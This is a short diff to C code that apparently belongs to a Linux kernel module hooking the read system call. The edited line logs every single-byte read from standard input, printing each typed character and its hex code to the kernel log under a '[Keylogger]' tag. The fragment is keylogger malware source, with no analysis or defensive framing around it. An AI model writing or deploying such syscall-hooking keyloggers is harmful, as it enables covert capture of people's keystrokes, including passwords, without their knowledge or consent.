@@ -25,7 +25,7 @@ asmlinkage long manipulated_read(unsigned int fd, char __user *buf, size_t count
 	//read from stdin and print it using printk
 	if(count == 1  && fd==0)
 	{
-		printk(KERN_INFO "0x%02x \n",buf[0]);
+		printk(KERN_INFO "[Keylogger] '%c' (0x%02x)\n", buf[0], buf[0]);
 	}
 
 	return ret;
